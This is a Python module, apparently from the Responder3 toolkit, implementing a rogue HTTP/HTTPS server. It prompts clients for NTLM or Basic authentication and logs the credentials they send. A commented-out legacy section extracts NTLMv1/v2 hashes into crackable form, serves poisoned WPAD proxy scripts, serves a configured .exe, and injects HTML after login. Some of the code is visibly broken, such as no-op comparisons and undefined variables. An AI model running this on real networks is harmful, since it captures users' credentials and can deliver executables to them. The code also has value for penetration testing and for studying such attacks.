import copy
import traceback
import struct
from base64 import b64decode
import logging
from responder3.core.servertemplate import ResponderServer, ResponderProtocolTCP, ProtocolSession

from responder3.utils import *
from responder3.protocols.HTTP import *

class HTTPSession(ProtocolSession):
	def __init__(self):
		ProtocolSession.__init__(self)
		#for protocol-level
		self._headersRecieved = False
		self.cmdParser    = HTTPRequestParser(encoding = 'utf-8')
		#for
		self.HTTPVersion          = HTTPVersion.HTTP11
		self.HTTPContentEncoding  = HTTPContentEncoding.IDENTITY
		self.HTTPConectentCharset = 'utf8'
		self.HTTPAtuhentication   = None
		self.HTTPCookie           = None
		self.HTTPServerBanner     = None
		self.currentState         = HTTPState.UNAUTHENTICATED

	def __repr__(self):
		t  = '== HTTPSession ==\r\n'
		t += '_headersRecieved: %s\r\n' % repr(self._headersRecieved)
		t += 'cmdParser:        %s\r\n' % repr(self.cmdParser)
		t += 'HTTPVersion:      %s\r\n' % repr(self.HTTPVersion)
		t += 'HTTPContentEncoding: %s\r\n' % repr(self.HTTPContentEncoding)
		t += 'HTTPConectentCharset: %s\r\n' % repr(self.HTTPConectentCharset)
		t += 'HTTPAtuhentication: %s\r\n' % repr(self.HTTPAtuhentication)
		t += 'HTTPCookie:       %s\r\n' % repr(self.HTTPCookie)
		t += 'HTTPServerBanner: %s\r\n' % repr(self.HTTPServerBanner)
		t += 'currentState:     %s\r\n' % repr(self.currentState)
		return t

class HTTP(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)
		

	def modulename(self):
		return 'HTTP'

	def setup(self):
		self.protocol = HTTPProtocol
		self.protocolSession = HTTPSession()
		#put settings parsing here!
		if self.settings is None:
			#default settings, basically just NTLm auth
			self.protocolSession.HTTPAtuhentication   = HTTPNTLMAuth()
			self.protocolSession.HTTPAtuhentication.setup()


		else:
			if 'authentication' in self.settings:
				#supported authentication mechanisms
				if self.settings['authentication']['authmecha'].upper() == 'NTLM':
					self.protocolSession.HTTPAtuhentication   = HTTPNTLMAuth()
					if 'settings' in self.settings['authentication']:
						self.protocolSession.HTTPAtuhentication.setup(self.settings['authentication']['settings'])
				elif self.settings['authmecha'].upper() == 'BASIC':
					self.protocolSession.HTTPAtuhentication  = HTTPBasicAuth()

				else:
					raise Exception('Unsupported HTTP authentication mechanism: %s' % (self.settings['authentication']['authmecha']))

				if 'cerdentials' in self.settings['authentication']:
					self.protocolSession.HTTPAtuhentication.verifyCreds = self.settings['authentication']['cerdentials']

		return

	def handle(self, httpReq, transport, session):
		try:
			if 'R3DEEPDEBUG' in os.environ:
				print(repr(session))
				self.log(logging.INFO,'Session state: %s Request: %s' % ( (session.currentState.name if session.currentState is not None else 'NONE') , repr(httpReq)), session)

			if session.currentState == HTTPState.UNAUTHENTICATED and session.HTTPAtuhentication is None:
				session.currentState == HTTPState.AUTHENTICATED
			
			if session.currentState == HTTPState.UNAUTHENTICATED:
				usercreds = session.HTTPAtuhentication.do_AUTH(httpReq, transport, session)
				if usercreds is not None:
					if isinstance(usercreds, list):
						for uc in usercreds:
							self.logResult(session, uc.toResult())
					else:
						self.logResult(session, usercreds.toResult())

			if session.currentState == HTTPState.AUTHFAILED:
				transport.write(HTTP403Resp(session, 'Basic').toBytes())
				transport.close()
				pass

			if session.currentState == HTTPState.AUTHENTICATED:
				#serve webpage or whatever
				transport.write(HTTP200Resp(session, body = 'SUCCSESS!').toBytes())
				transport.close()
				pass

		except Exception as e:
			traceback.print_exc()
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			pass

class HTTPProtocol(ResponderProtocolTCP):
	
	def __init__(self, server):
		ResponderProtocolTCP.__init__(self, server)
		#reasoning: HTTP server does the parsing of the settings, but some setting parameters are modifying the session object
		self._session = copy.deepcopy(server.protocolSession)

	def _parsebuff(self):
		if len(self._buffer) > self._buffer_maxsize:
			raise Exception('Data in buffer too large!')

		if not self._session._headersRecieved:
			marker = self._buffer.find(b'\r\n\r\n') 
			if marker == -1:
				return
			else:
				#buffer contains header data
				self._session._headersRecieved = True
				self._ramainingData = self._session.cmdParser.parseHeader(self._buffer[:marker])
				self._buffer = self._buffer[marker+4:]


		if self._session._headersRecieved and len(self._buffer) >= self._ramainingData:
			#we have recieved all data for the request, and the request contained body data
			httpreq = self._session.cmdParser.parseBody(self._buffer[:self._ramainingData])
			self._buffer = self._buffer[self._ramainingData:]
			self._session._headersRecieved = False

			self._server.handle(httpreq, self._transport, self._session)
			
			if len(self._buffer) > 0:
				#keep parsing until we consumed all data
				self._parsebuff()

		return
		

		
	def _parsereq(self):
		req = self._session.cmdParser.parse(io.BytesIO(self._buffer[:marker+1]))
		
		self._server.handle(_httpreq, self._transport)

class HTTPS(HTTP):
	def modulename(self):
		return 'HTTPS'


"""

class HTTPReq():

	def __init__(self):
		self.rawdata = ''
		self.method = ''
		self.uri = ''
		self.version = ''
		self.headers = {}
		self.body = None

		self.authorization = None

		self.isWebDAV = False
		self.isFirefox = False
		self.isWpad = False

	def parse(self, data):
		self.rawdata = data
		header, self.data = self.rawdata.split('\r\n\r\n')

		request = ''
		first = True
		for line in header.split('\r\n'):
			if first:
				request = line
				first = False
				continue

			marker = line.find(':')
			if marker == -1:
				raise Exception('Header parsing error!' + repr(line))
			
			self.headers[line[:marker].strip().lower()] = line[marker+1:].strip()

		self.method, self.uri, self.version = request.split(' ')

		if self.uri.endswith('wpad.dat') or self.uri.endswith('.pac'):
			self.isWpad = True

		if self.method == 'PROPFIND':
			self.isWebDAV = True

		if 'user-agent' in self.headers:
			if self.headers['user-agent'].find('Firefox') != -1:
				self.isFirefox = True

		if 'authorization' in self.headers:
			self.authorization = HTTPAuthorization()
			self.authorization.parse(self.headers['authorization'])

	def toDict(self):
		t = {}
		t['method'] = self.method
		t['uri'] = self.uri
		t['version'] = self.version
		t['headers'] = self.headers
		t['authorization'] = self.authorization
		if t['authorization'] is not None:
			t['authorization'] = self.authorization.toDict()

		t['isWebDAV'] = self.isWebDAV
		t['isFirefox'] =  self.isFirefox
		t['isWpad'] = self.isWpad
		return t
	def toJSON(self):
		return json.dumps(self.toDict())

	def __str__(self):
		return self.toJSON()



class HTTP(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)
		self.protocol = HTTPProtocol
		self.challenge = None

	def modulename(self):
		return 'HTTP'

	def handle(self, request, transport):
		#self.log(logging.DEBUG, 'Handling request %s' % str(request))

		try:
			if request.isWpad:
				if request.isFirefox:
					self.log(logging.INFO,"WARNING! Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.")
					self.log(logging.INFO,"WARNING! The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)")


				Buffer = self.WpadCustom(request)

				if self.settings['Force_WPAD_Auth'] == False:
					transport.write(Buffer)
					self.log(logging.ERROR, 'WPAD (no auth) file sent')
					return
			else:
				Buffer = self.PacketSequence(request, transport)
				#self.log(logging.DEBUG, 'Response: ' + Buffer.decode())
				transport.write(Buffer)
				return

		except Exception as e:
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			traceback.print_exc()
			return

	def RandomChallenge(self):
		if self.settings['NumChal'] == "random":
			from random import getrandbits
			NumChal = '%016x' % getrandbits(16 * 4)
			Challenge = b''
			for i in range(0, len(NumChal),2):
				Challenge += bytes.fromhex(NumChal[i:i+2])
			return Challenge
		else:
			return bytes.fromhex(self.settings['Challenge'])

	def WpadCustom(self, request):
		if request.isWpad:
			if request.isFirefox:
				Buffer = WPADScript(Payload=b"function FindProxyForURL(url, host){return 'DIRECT';}")
				Buffer.calculate()
				return Buffer.getdata()

			else:
				Buffer = WPADScript(Payload=settings.Config.WPAD_Script.encode('ascii'))
				Buffer.calculate()
				return Buffer.getdata()
		
		return False
	
	
	# Handle HTTP packet sequence.
	def PacketSequence(self, request, transport):
		# Serve the .exe if needed
		if self.settings['Serve_Always'] is True or (self.settings['Serve_Exe'] is True and re.findall('.exe', data)):
			return self.RespondWithFile(self.settings['Exe_Filename'], self.settings['Exe_DlName'])

		# Serve the custom HTML if needed
		if self.settings['Serve_Html']:
			return self.RespondWithFile(self.settings['Html_Filename'])

		WPAD_Custom = self.WpadCustom(request)
		# Webdav
		if request.method == 'OPTIONS':
			Buffer = WEBDAV_Options_Answer()
			return Buffer.getdata(),

		if request.authorization is not None:
			if request.authorization.type == 'NTLM':


				Packet_NTLM = b64decode(''.join(request.authorization.data))[8:9]
				self.log(logging.DEBUG,"Challenge 2: %s" % self.challenge.hex())
				if Packet_NTLM == b"\x01":

					#Buffer = NTLM_Challenge(ServerChallenge=self.challenge, TargetNameStr = b'SMB', Av3Str=b'56k.io', Av4Str=b'creds.56k.io',Av5Str=b'56k.io')
					Buffer = NTLM_Challenge(ServerChallenge=self.challenge)
					Buffer.calculate()

					Buffer_Ans = IIS_NTLM_Challenge_Ans()
					Buffer_Ans.calculate(Buffer.getdata())
					return Buffer_Ans.getdata()

				if Packet_NTLM == b"\x03":
					NTLM_Auth = b64decode(''.join(request.authorization.data))
					if request.isWebDAV:
						module = "WebDAV"
					else:
						module = "HTTP"
					self.ParseHTTPHash(NTLM_Auth, module)

				if self.settings['Force_WPAD_Auth'] and WPAD_Custom:
					self.log(logging.INFO, 'WPAD (auth) file sent') 
					return WPAD_Custom
				else:
					Buffer = IIS_Auth_Granted(Payload=self.settings['HtmlToInject'].encode())
					Buffer.calculate()
					return Buffer.getdata()

			elif request.authorization.type == 'Basic':
				ClearText_Auth = b64decode(''.join(request.authorization.data)).decode()
				#log http req?

				self.logResult({
					'module': 'HTTP', 
					'type': 'Basic', 
					'client': self.peername, 
					'user': ClearText_Auth.split(':')[0], 
					'cleartext': ClearText_Auth.split(':')[1], 
				})

				if self.settings['Force_WPAD_Auth'] and WPAD_Custom:
					self.log(logging.INFO, 'WPAD (auth) file sent') 
					return WPAD_Custom
				else:
					Buffer = IIS_Auth_Granted(Payload=self.settings['HtmlToInject'].encode())
					Buffer.calculate()
					return Buffer.getdata()
		else:
			if self.settings['Basic']:
				Response = IIS_Basic_401_Ans()
				self.log(logging.INFO, 'Sending BASIC authentication request') 

			else:
				Response = IIS_Auth_401_Ans()
				self.log(logging.INFO, 'Sending NTLM authentication request') 

			return Response.getdata()

	def RespondWithFile(self, filename, dlname=None):

		if filename.endswith('.exe'):
			Buffer = ServeExeFile(Payload = self.ServeFile(filename), ContentDiFile=dlname)
		else:
			Buffer = ServeHtmlFile(Payload = self.ServeFile(filename))

		Buffer.calculate()
		self.log(logging.INFO, "Sending file %s to %s" % (filename, self.client))
		return Buffer.getdata()


	# Parse NTLMv1/v2 hash.
	#data, Challenge, client, module
	def ParseHTTPHash(self, data, module):
		LMhashLen    = struct.unpack('<H',data[12:14])[0]
		LMhashOffset = struct.unpack('<H',data[16:18])[0]
		LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].hex().upper()

		NthashLen    = struct.unpack('<H',data[20:22])[0]
		NthashOffset = struct.unpack('<H',data[24:26])[0]
		NTHash       = data[NthashOffset:NthashOffset+NthashLen].hex().upper()

		UserLen      = struct.unpack('<H',data[36:38])[0]
		UserOffset   = struct.unpack('<H',data[40:42])[0]
		User         = data[UserOffset:UserOffset+UserLen].replace(b'\x00',b'').decode()

		if NthashLen == 24:
			HostNameLen     = struct.unpack('<H',data[46:48])[0]
			HostNameOffset  = struct.unpack('<H',data[48:50])[0]
			HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace(b'\x00',b'').decode()
			WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, self.challenge.hex())
			self.logResult({
				'module': module, 
				'type': 'NTLMv1', 
				'client': self.peername, 
				'host': HostName, 
				'user': User, 
				'hash': LMHash+":"+NTHash, 
				'fullhash': WriteHash,
			})

		if NthashLen > 24:
			NthashLen      = 64
			DomainLen      = struct.unpack('<H',data[28:30])[0]
			DomainOffset   = struct.unpack('<H',data[32:34])[0]
			Domain         = data[DomainOffset:DomainOffset+DomainLen].replace(b'\x00',b'').decode()
			HostNameLen    = struct.unpack('<H',data[44:46])[0]
			HostNameOffset = struct.unpack('<H',data[48:50])[0]
			HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace(b'\x00',b'').decode()
			WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, self.challenge.hex(), NTHash[:32], NTHash[32:])
 
			self.logResult({
				'module': module, 
				'type': 'NTLMv2', 
				'client': self.peername, 
				'host': HostName, 
				'user': Domain + '\\' + User,
				'hash': NTHash[:32] + ":" + NTHash[32:],
				'fullhash': WriteHash,
			})

	def ServeFile(self, Filename):
		with open (Filename, "rb") as bk:
			return bk.read()
"""



